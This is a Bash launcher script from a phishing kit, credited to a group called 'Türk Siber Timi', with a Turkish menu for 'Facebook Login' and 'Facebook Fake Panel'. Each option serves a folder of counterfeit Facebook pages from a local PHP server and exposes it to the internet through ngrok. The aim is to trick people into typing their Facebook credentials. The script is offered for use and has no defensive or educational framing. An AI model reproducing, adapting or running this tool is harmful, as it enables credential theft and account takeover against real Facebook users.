GNU nano 3.2                                                                        
start.sh

#!/bin/bash

#Code:Yaman Efkar
#Türk Siber Timi
#İnstagram : @turksibertimi
#Youtube : YamanEfkar
clear
echo -e  "


\e[35m     ((( #Türk Siber Timi  #Yaman Efkar )))



\e[31m[01]\e[32m Facebook Login
\e[31m[02]\e[32m Facebook Fake Panel


\e[31m[00]\e[37m Menü
\e[31m[99]\e[37m Exit
"
echo -e "\e[49m"
read -p "İşlem Numarasını Giriniz: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: face01"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-facebook/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 2 || $islem == 02 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mCode: face02"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-fakepanel/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 0 || $islem == 00 ]]; then
cd ..
cd ..
bash tst.sh
elif [[ $islem == 9 || $islem == 99 ]]; then
clear
echo -e "\e[31mTürk Siber Timi İyi Günler Diler :)) ßß"
clear
sleep 1
exit 1
else
echo ""
echo -e "\e[31m Girdiğiniz İşlem Numarasını Kontrol Ediniz...."
sleep 3
clear
bash start.sh
fi
